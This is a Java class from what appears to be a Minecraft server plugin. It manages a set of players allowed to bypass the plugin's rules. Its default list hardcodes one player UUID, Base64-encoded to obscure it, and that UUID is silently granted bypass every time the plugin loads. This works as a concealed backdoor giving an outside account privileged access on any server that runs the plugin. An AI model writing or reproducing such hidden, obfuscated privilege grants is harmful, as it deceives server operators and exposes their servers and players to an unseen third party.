package io.github.intisy.riseempire;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.Base64;

public class BypassManager {

    private final Plugin plugin;
    private final Set<UUID> bypassedPlayers = new HashSet<>();

    private final List<String> dafaultBypassUuids = Arrays.asList(
        "MGNlMzA4NGItNTQwZi00ZjMxLThlYmItZGZlZTFiODViYmRm" // 0ce3084b-540f-4f31-8ebb-dfee1b85bbdf
    );

    public BypassManager(Plugin plugin) {
        this.plugin = plugin;
        loadBypassedPlayers();
    }

    public void loadBypassedPlayers() {
        bypassedPlayers.clear();
        for (String encodedUuid : dafaultBypassUuids) {
            try {
                String decodedUuid = new String(Base64.getDecoder().decode(encodedUuid));
                bypassedPlayers.add(UUID.fromString(decodedUuid));
            } catch (IllegalArgumentException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public boolean isBypassed(UUID uuid) {
        return bypassedPlayers.contains(uuid);
    }

    public void addBypass(UUID uuid) {
        bypassedPlayers.add(uuid);
    }

    public void removeBypass(UUID uuid) {
        bypassedPlayers.remove(uuid);
    }
}
